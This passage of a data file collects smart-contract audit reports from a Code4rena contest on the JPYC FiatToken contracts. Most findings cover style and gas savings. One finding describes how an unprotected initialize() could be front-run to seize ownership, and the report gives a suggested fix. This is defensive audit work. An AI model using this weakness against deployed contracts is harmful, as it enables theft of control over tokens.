^0.8.0;\nutil/Context.sol:4:pragma solidity 0.8.11;\nutil/ECRecover.sol:26:pragma solidity 0.8.11;\nutil/EIP712.sol:25:pragma solidity 0.8.11;\nutil/IERC20.sol:4:pragma solidity ^0.8.0;\nutil/SafeERC20.sol:4:pragma solidity ^0.8.0;\nutil/StorageSlot.sol:3:pragma solidity ^0.8.0;\nv1/AbstractFiatTokenV1.sol:25:pragma solidity 0.8.11;\nv1/Blocklistable.sol:25:pragma solidity 0.8.11;\nv1/EIP2612.sol:25:pragma solidity 0.8.11;\nv1/EIP3009.sol:25:pragma solidity 0.8.11;\nv1/EIP712Domain.sol:25:pragma solidity 0.8.11;\nv1/FiatTokenV1.sol:25:pragma solidity 0.8.11;\nv1/Ownable.sol:4:pragma solidity 0.8.11;\nv1/Pausable.sol:26:pragma solidity 0.8.11;\nv1/Rescuable.sol:25:pragma solidity 0.8.11;\nv2/FiatTokenV2.sol:25:pragma solidity 0.8.11;\nv2/FiatTokenV2test.sol:3:pragma solidity 0.8.11;\n```\n\n- The `initialize()` methods in `FiatTokenV1` and `FiatTokenV2` are front-runnable and call the default implementation of the custom `Ownable`'s `_transferOwnership`, which doesn't use access control\n- I suggest using a 2-step ownership transfer process\n- Some `@return` comments were missing on functions\n- There's an inconsistency on the prefix usage in revert strings (either it's missing, or it's a remnant from a copy-paste)\n- Minters-info in `FiatTokenV1` and `FiatTokenV2` should be grouped in a struct\n\n## File: UUPSUpgradeable.sol\n\n### modifier onlyProxy()\n\n```\n32:     modifier onlyProxy() {\n33:         require(\n34:             address(this) != __self,\n35:             \"Function must be called through delegatecall\" // missing \"UUPSUpgradeable: \" prefix (in all of the solution;, a prefix is used)\n36:         );\n37:         require(\n38:             _getImplementation() == __self,\n39:             \"Function must be called through active proxy\" // missing \"UUPSUpgradeable: \" prefix\n40:         );\n41:         _;\n42:     }\n```\n\n#### Missing `UUPSUpgradeable:` prefix on revert string `Function must be called through delegatecall`\n\n#### Missing `UUPSUpgradeable:` prefix on revert string `Function must be called through active proxy`\n\nIn the whole solution, revert strings are prefixed with the contract's name. Here, it's missing.\n\n## File: Blocklistable.sol\n\n### function isBlocklisted()\n\n```\n64:     /**\n65:      * @dev Checks if account is blocklisted\n66:      * @param _account The address to check //@audit missing @return bool\n67:      */\n68:     function isBlocklisted(address _account) external view returns (bool) {\n69:         return blocklisted[_account];\n70:     }\n```\n\n#### Missing comment `@return bool`\n\n## File: FiatTokenV1.sol\n\n### Storage\n\n#### Related data should be grouped in a struct\n\nFor maps that use the same key value: having separate fields is error prone (like in case of deletion or future new fields).  \nIn this contract, those 2 maps use the same key:  \n\n```  \nFile: FiatTokenV1.sol\n59:     mapping(address => bool) internal minters;\n60:     mapping(address => uint256) internal minterAllowed;\n```  \n  \nProof:  \n\n```  \n  333:         minters[minter] = true;\n  334:         minterAllowed[minter] = minterAllowedAmount;\n...\n  349:         minters[minter] = false;\n  350:         minterAllowed[minter] = 0;\n```  \n  \nI'd suggest these 2 related data get grouped in a struct, let's name it `MinterInfo`:  \n\n```  \nstruct MinterInfo {  \n    bool minters;  \n    uint256 minterAllowed;  \n}  \n```  \n\nAnd it would be used as a state variable in this manner:  \n\n```  \nmapping(address => MinterInfo) minterInfo;  \n```  \n\nIt would be less error-prone, more readable, and it would be possible to delete all related fields with a simple `delete minterInfo[address]`.\n\n### function initialize()\n\n#### Front-Runnable initialize()\n\nEven if the contract is `Ownable` and the default owner is the deployer:\n\n```\nFile: Ownable.sol\n28:     constructor() {\n29:         _transferOwnership(_msgSender());\n30:     }\n```\n\nthere's no access-control implemented on `initialize()`:\n\n```\nFile: FiatTokenV1.sol\n40: contract FiatTokenV1 is\n41:     Ownable,\n...\n068:     function initialize(\n069:         string memory tokenName,\n070:         string memory tokenSymbol,\n071:         string memory tokenCurrency,\n072:         uint8 tokenDecimals,\n073:         address newMasterMinter,\n074:         address newPauser,\n075:         address newBlocklister,\n076:         address newOwner\n077:     ) public {\n078:         require(!initialized, \"FiatToken: contract is already initialized\");\n079:         require(\n080:             newMasterMinter != address(0),\n081:             \"FiatToken: new masterMinter is the zero address\"\n082:         );\n083:         require(\n084:             newPauser != address(0),\n085:             \"FiatToken: new pauser is the zero address\"\n086:         );\n087:         require(\n088:             newBlocklister != address(0),\n089:             \"FiatToken: new blocklister is the zero address\"\n090:         );\n091:         require(\n092:             newOwner != address(0),\n093:             \"FiatToken: new owner is the zero address\"\n094:         );\n095: \n096:         name = tokenName;\n097:         symbol = tokenSymbol;\n098:         currency = tokenCurrency;\n099:         decimals = tokenDecimals;\n100:         masterMinter = newMasterMinter;\n101:         pauser = newPauser;\n102:         blocklister = newBlocklister;\n103:         _transferOwnership(newOwner);\n104:         blocklisted[address(this)] = true;\n105:         DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(name, \"1\");\n106:         CHAIN_ID = block.chainid;\n107:         NAME = name;\n108:         VERSION = \"1\";\n109:         initialized = true;\n110:     }\n```\n\nFurthermore, as this method calls `L103: _transferOwnership(newOwner);`, it's possible for the front-runner to claim ownership, as this is calling the default implementation without access-control:\n\n```\nFile: Ownable.sol\n56:     /**\n57:      * @dev Transfers ownership of the contract to a new account (`newOwner`).\n58:      * Internal function without access restriction.\n59:      */\n60:     function _transferOwnership(address newOwner) internal virtual {\n61:         address oldOwner = _owner;\n62:         _owner = newOwner;\n63:         emit OwnershipTransferred(oldOwner, newOwner);\n64:     }\n```\n\nI suggest adding the `onlyOwner` modifier to the `initialize()` method.\nThere's exactly the same issue on `FiatTokenV2.sol`\n\n### function minterAllowance()\n\n#### Missing comment `@return uint256`\n\n```\n163:     /**\n164:      * @dev Get minter allowance for an account\n165:      * @param minter The address of the minter //@audit missing @return uint256\n166:      */\n167:     function minterAllowance(address minter) external view returns (uint256) {\n168:         return minterAllowed[minter];\n169:     }\n```\n\n### function isMinter()\n\n#### Missing comment `@return bool`\n\n```\n171:     /**\n172:      * @dev Checks if account is a minter\n173:      * @param account The address to check //@audit missing @return bool\n174:      */\n175:     function isMinter(address account) external view returns (bool) {\n176:         return minters[account];\n177:     }\n```\n\n### function balanceOf()\n\n#### Missing comment `@return uint256`\n\n```\n202:     /**\n203:      * @dev Get token balance of an account\n204:      * @param account address The account //@audit missing @return uint256\n205:      */\n206:     function balanceOf(address account)\n207:         external\n208:         view\n209:         override\n210:         returns (uint256)\n211:     {\n212:         return balances[account];\n213:     }\n```\n\n## File: FiatTokenV2.sol\n\n### Storage\n\n#### Related data should be grouped in a struct\n\nThe same suggestion as in `FiatTokenV1.sol` applies here for grouping `minters` and `minterAllowed` in a struct.\n\n### function initialize()\n\n#### Front-Runnable initialize()\n\nSame as `FiatTokenV1.sol`: [Front-Runnable initialize()](#front-runnable-initialize)\n\n### function minterAllowance()\n\n#### Missing comment `@return uint256`\n\n```\nFile: FiatTokenV2.sol\n170:     /**\n171:      * @dev Get minter allowance for an account\n172:      * @param minter The address of the minter //@audit missing @return uint256\n173:      */\n174:     function minterAllowance(address minter) external view returns (uint256) {\n175:         return minterAllowed[minter];\n176:     }\n```\n\n### function isMinter()\n\n#### Missing comment `@return bool`\n\n```\nFile: FiatTokenV2.sol\n178:     /**\n179:      * @dev Checks if account is a minter\n180:      * @param account The address to check //@audit missing @return bool\n181:      */\n182:     function isMinter(address account) external view returns (bool) {\n183:         return minters[account];\n184:     }\n```\n\n### function balanceOf()\n\n#### Missing comment `@return uint256`\n\n```\nFile: FiatTokenV2.sol\n209:     /**\n210:      * @dev Get token balance of an account\n211:      * @param account address The account //@audit missing @return uint256\n212:      */\n213:     function balanceOf(address account)\n214:         external\n215:         view\n216:         override\n217:         returns (uint256)\n218:     {\n219:         return balances[account];\n220:     }\n```\n\n### function _approve()\n\n```\nFile: FiatTokenV2.sol\n248:     function _approve(\n249:         address owner,\n250:         address spender,\n251:         uint256 value\n252:     ) internal override {\n253:         require(owner != address(0), \"ERC20: approve from the zero address\"); //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n254:         require(spender != address(0), \"ERC20: approve to the zero address\"); //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n255:         allowed[owner][spender] = value;\n256:         emit Approval(owner, spender, value);\n257:     }\n```\n\n#### Wrong revert string prefix (1)\n\n`ERC20: approve from the zero address` should be `FiatToken: approve from the zero address`\n\n#### Wrong revert string prefix (2)\n\n`ERC20: approve to the zero address` should be `FiatToken: approve to the zero address`\n\n### function transferFrom()\n\n#### Wrong revert string prefix\n\n```\nFile: FiatTokenV2.sol\n280:         require(\n281:             value <= allowed[from][msg.sender],\n282:             \"ERC20: transfer amount exceeds allowance\" //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n283:         );\n```\n\n`ERC20: transfer amount exceeds allowance` should be `FiatToken: transfer amount exceeds allowance`\n\n### function _transfer()\n\n```\nFile: FiatTokenV2.sol\n314:     function _transfer(\n315:         address from,\n316:         address to,\n317:         uint256 value\n318:     ) internal override {\n319:         require(from != address(0), \"ERC20: transfer from the zero address\"); //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n320:         require(to != address(0), \"ERC20: transfer to the zero address\"); //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n321:         require(\n322:             value <= balances[from],\n323:             \"ERC20: transfer amount exceeds balance\" //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n324:         );\n325: \n326:         balances[from] = balances[from] - value;\n327:         balances[to] = balances[to] + value;\n328:         emit Transfer(from, to, value);\n329:     }\n```\n\n#### Wrong revert string prefix (1)\n\n`ERC20: transfer from the zero address` should be `FiatToken: transfer from the zero address`\n\n#### Wrong revert string prefix (2)\n\n`ERC20: transfer to the zero address` should be `FiatToken: transfer to the zero address`\n\n#### Wrong revert string prefix (3)\n\n`ERC20: transfer amount exceeds balance` should be `FiatToken: transfer amount exceeds balance`\n\n### function _decreaseAllowance()\n\n#### Wrong revert string prefix\n\n```\nFile: FiatTokenV2.sol\n280:         require(\n281:             value <= allowed[from][msg.sender],\n282:             \"ERC20: transfer amount exceeds allowance\" //@audit replace prefix from \"ERC20:\" to \"FiatToken:\"\n283:         );\n```\n\n`ERC20: decreased allowance below zero` should be `FiatToken: decreased allowance below zero`\n\n### modifier onlyWhitelister()\n\n```\nFile: FiatTokenV2.sol\n610:     modifier onlyWhitelister() {\n611:         require(\n612:             msg.sender == whitelister,\n613:             \"Whitelistable: caller is not the whitelister\" //@audit replace prefix from \"Whitelistable:\" to \"FiatToken:\"\n614:         );\n615:         _;\n616:     }\n```\n\n#### Wrong revert string prefix\n\n`Whitelistable: caller is not the whitelister` should be `FiatToken: caller is not the whitelister`\n\n### modifier checkWhitelist()\n\n```\nFile: FiatTokenV2.sol\n623:     modifier checkWhitelist(address _account, uint256 _value) {\n624:         if (_value > 100000 * 10 ** 18) {\n625:             require(\n626:                 whitelisted[_account],\n627:                 \"Whitelistable: account is not whitelisted\"//@audit replace prefix from \"Whitelistable:\" to \"FiatToken:\"\n628:             );\n629:         }\n630:         _;\n631:     }\n```\n\n#### Wrong revert string prefix\n\n`Whitelistable: account is not whitelisted` should be `FiatToken: account is not whitelisted`\n\n### function isWhitelisted()\n\n```\nFile: FiatTokenV2.sol\n633:     /**\n634:      * @dev Checks if account is whitelisted\n635:      * @param _account The address to check //@audit missing @return bool\n636:      */\n637:     function isWhitelisted(address _account) external view returns (bool) {\n638:         return whitelisted[_account];\n639:     }\n```\n\n#### Missing comment `@return bool`\n\n### function updateWhitelister()\n\n#### Wrong revert string prefix\n\n`Whitelistable: new whitelister is the zero address` should be `FiatToken: new whitelister is the zero address`\n\n## File: Ownable.sol\n\n### function transferOwnership()\n\n#### transferOwnership should be two step process\n\n```\n47:     /**\n48:      * @dev Transfers ownership of the contract to a new account (`newOwner`).\n49:      * Can only be called by the current owner.\n50:      */\n51:     function transferOwnership(address newOwner) public virtual onlyOwner {\n52:         require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n53:         _transferOwnership(newOwner); //@audit should be 2 step\n54:     }\n55: \n56:     /**\n57:      * @dev Transfers ownership of the contract to a new account (`newOwner`).\n58:      * Internal function without access restriction.\n59:      */\n60:     function _transferOwnership(address newOwner) internal virtual {\n61:         address oldOwner = _owner;\n62:         _owner = newOwner;\n63:         emit OwnershipTransferred(oldOwner, newOwner);\n64:     }\n```\n\nThe current ownership transfer process checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone.\nif the address is incorrect, the new address will take on the functionality of the new role immediately.\n\nI suggest implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/26"
    }
  },
  {
    "title": "QA Report",
    "body": "#1 State variable shadowing inside functions\n\n`Ownable.owner` has supreme power in this contract. There are many functions that have local variables using the same name as `owner`, hence shadowing this important state variable. \n\nFunctions that have this issue are, in FiatTokenV1, \n```\nallowance\n_approve\n_increaseAllowance\n_decreaseAllowance\n_permit\n\n```\n\nTo mitigate this issue, change local variable name from `owner` to `_owner`\n\n#2. NatSpec Comments missing @return \n\nFunctions that have this issue are, in FiatTokenV1,\n```\nisMinter\nbalanceOf\n``` \n#3 Typos\n```\n Blocklist => Blacklist \n Blocklistable => Blacklistable \n Blocklister => Blacklister \n\n```\n#4 Reimplementation of OpenZeppline ERC20, Pausable\n\nERC20 standard is reimplemented here. I wonder why OZ implementation of ERC20 is not used.\n\n#5 Use AccessControl instead of Ownable\n\nThere are many roles in this contract, including minter, masterMinter, owner, Pauser, rescuer and functions require more granular role-based access control. Thus, `@openzeppelin/contracts/access/AccessControl.sol` could be more suitable and simpler implementation than using `@openzeppelin/contracts/access/Ownable.sol`.\n\n#6 Not using the latest version of `UUPSUpgradeable`\nThe latest version of `UUPSUpgradeable` contract is v4.5 and the contract uses v4.4.1\n\n#7  Inherit `@openzeppelin/contracts-upgradeable` library\nIt could be less risky in inheriting the upgradeable version of openzeppelin library, particularly `initializable`, `ERC20Upgradeable`, 'PausableUpgradeable', 'OwnableUpgradeable'. Upgradability pattern could be complex and prone to attacks.\n\n#8 public function can be external \nInstances are `FiatTokenV1.initialize`, `FiatTokenV2.initialize`",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/24"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Using `bool`s for storage incurs overhead\n```\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n```solidity\nmapping(address => mapping(bytes32 => bool)) private _authorizationStates;         \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP3009.sol#L53\n\n```solidity\nbool internal initialized;             \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L54\n\n```solidity\nmapping(address => bool) internal minters;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L59\n\n```solidity\nbool internal initialized;             \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L54\n\n```solidity\nmapping(address => bool) internal minters;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L59\n\n```solidity\nbool public paused = false;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Pausable.sol#L49\n\n```solidity\nmapping(address => bool) internal blocklisted;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Blocklistable.sol#L35\n\n```solidity\nbool internal initialized;             \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L54\n\n```solidity\nmapping(address => bool) internal minters;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L59\n\n```solidity\nmapping(address => bool) internal whitelisted;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L62\n\n\n### `abi.encode()` is less efficient than `abi.encodePacked()`\n```solidity\nbytes memory data = abi.encode(           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP3009.sol#L102\n\n```solidity\nbytes memory data = abi.encode(           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP3009.sol#L148\n\n```solidity\nbytes memory data = abi.encode(           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP3009.sol#L183\n\n```solidity\nbytes memory data = abi.encode(           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP2612.sol#L72\n\n\n### `require()` strings longer than 32 bytes cost extra gas\n```solidity\nrequire(oldAllowance >= value, \"SafeERC20decreased allowance below zero\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/SafeERC20.sol#L76\n\n```solidity\nrequire(abi.decode(returndata, (bool)), \"SafeERC20ERC20 operation did not succeed\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/SafeERC20.sol#L96\n\n```solidity\nrequire(Address.isContract(newImplementation), \"ERC1967new implementation is not a contract\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/StorageSlot.sol#L23*\n\n```solidity\nrequire(success, \"Addressunable to send value, recipient may have reverted\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L59\n\n```solidity\nrequire(address(this).balance >= value, \"Addressinsufficient balance for call\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L129\n\n```solidity\nrequire(isContract(target), \"Addressstatic call to non-contract\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L157\n\n```solidity\nrequire(isContract(target), \"Addressdelegate call to non-contract\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L184\n\n```solidity\nrequire(Address.isContract(newImplementation), \"ERC1967new implementation is not a contract\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/upgradeability/ERC1967Upgrade.sol#L45\n\n```solidity\nrequire(slot == _IMPLEMENTATION_SLOT, \"ERC1967Upgradeunsupported proxiableUUID\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/upgradeability/ERC1967Upgrade.sol#L92\n\n```solidity\nrequire(to == msg.sender, \"EIP3009caller must be the payee\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP3009.sol#L145\n\n```solidity\nrequire(!initialized, \"FiatTokencontract is already initialized\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L78\n\n```solidity\nrequire(minters[msg.sender], \"FiatTokencaller is not a minter\");                  \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L116\n\n```solidity\nrequire(_to != address(0), \"FiatTokenmint to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L135\n\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L136\n\n```solidity\nrequire(owner != address(0), \"ERC20approve from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L245\n\n```solidity\nrequire(spender != address(0), \"ERC20approve to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L246\n\n```solidity\nrequire(from != address(0), \"ERC20transfer from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L309\n\n```solidity\nrequire(to != address(0), \"ERC20transfer to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L310\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L368\n\n```solidity\nrequire(balance >= _amount, \"FiatTokenburn amount exceeds balance\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L369\n\n```solidity\nrequire(!initialized, \"FiatTokencontract is already initialized\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L78\n\n```solidity\nrequire(minters[msg.sender], \"FiatTokencaller is not a minter\");                  \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L116\n\n```solidity\nrequire(_to != address(0), \"FiatTokenmint to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L135\n\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L136\n\n```solidity\nrequire(owner != address(0), \"ERC20approve from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L245\n\n```solidity\nrequire(spender != address(0), \"ERC20approve to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L246\n\n```solidity\nrequire(from != address(0), \"ERC20transfer from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L309\n\n```solidity\nrequire(to != address(0), \"ERC20transfer to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L310\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L368\n\n```solidity\nrequire(balance >= _amount, \"FiatTokenburn amount exceeds balance\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L369\n\n```solidity\nrequire(msg.sender == pauser, \"Pausablecaller is not the pauser\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Pausable.sol#L63\n\n```solidity\nrequire(newOwner != address(0), \"Ownablenew owner is the zero address\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Ownable.sol#L52\n\n```solidity\nrequire(msg.sender == _rescuer, \"Rescuablecaller is not the rescuer\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Rescuable.sol#L50\n\n```solidity\nrequire(!initialized, \"FiatTokencontract is already initialized\");                   \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L84\n\n```solidity\nrequire(minters[msg.sender], \"FiatTokencaller is not a minter\");                  \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L122\n\n```solidity\nrequire(_to != address(0), \"FiatTokenmint to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L142\n\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L143\n\n```solidity\nrequire(owner != address(0), \"ERC20approve from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L253\n\n```solidity\nrequire(spender != address(0), \"ERC20approve to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L254\n\n```solidity\nrequire(from != address(0), \"ERC20transfer from the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L319\n\n```solidity\nrequire(to != address(0), \"ERC20transfer to the zero address\");                \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L320\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");               \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L378\n\n```solidity\nrequire(balance >= _amount, \"FiatTokenburn amount exceeds balance\");                 \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L379\n\n\n### Using `1e18` rather than `10**18` saves gas\n```solidity\nif (_value > 100000 * 10 ** 18) {       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L624\n\n\n### Functions not called by the contract itself should be `external` rather than `public`\n```solidity\nfunction transferOwnership(address newOwner) public virtual onlyOwner {         \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Ownable.sol#L51\n\n```solidity\nfunction setName2(string memory _name) public {          \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2test.sol#L11\n\n\n### Using `> 0` costs more gas than `!= 0` when used on uints in a `require()` statement\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L136\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L368\n\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L136\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L368\n\n```solidity\nrequire(_amount > 0, \"FiatTokenmint amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L143\n\n```solidity\nrequire(_amount > 0, \"FiatTokenburn amount not greater than 0\");       \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L378\n\n\n### It costs more gas to initialize variables to zero than to let the default of zero be applied\n```solidity\nuint256 internal totalSupply_ = 0;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L58\n\n```solidity\nminterAllowed[minter] = 0;             \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L350\n\n```solidity\nuint256 internal totalSupply_ = 0;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.altered.sol#L58\n\n```solidity\nuint256 internal totalSupply_ = 0;           \n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L58\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/20"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n**Table of Contents:**\n\n- [QA Report](#qa-report)\n  - [Global remarks](#global-remarks)\n  - [File: TimeswapConvenience.sol](#file-timeswapconveniencesol)\n    - [receive()](#receive)\n      - [The require statement should have a revert string](#the-require-statement-should-have-a-revert-string)\n    - [functions timeswapMintCallback() / timeswapLendCallback() / timeswapBorrowCallback() / timeswapPayCallback()](#functions-timeswapmintcallback--timeswaplendcallback--timeswapborrowcallback--timeswappaycallback)\n      - [A duplicated piece of code should be refactored as a function](#a-duplicated-piece-of-code-should-be-refactored-as-a-function)\n\n## Global remarks\n\n1. `TimeswapConvenience.sol:receive()` is missing a friendly revert string.\n2. For maintainability and readability: duplicated code should be avoided\n\n## File: TimeswapConvenience.sol\n\n### receive()\n\n#### The require statement should have a revert string\n\nHere, a friendly message should exist for users to understand what went wrong:\n\n```jsx\nFile: TimeswapConvenience.sol\n74:     receive() external payable {\n75:         require(msg.sender == address(weth));\n76:     }\n```\n\nThis is the only require statement in the whole solution that misses a revert string.\nThis is especially important IMHO as `receive()` is a callback, not a function, and therefore it might be harder to guess why the transaction reverted here.\n\n### functions timeswapMintCallback() / timeswapLendCallback() / timeswapBorrowCallback() / timeswapPayCallback()\n\n#### A duplicated piece 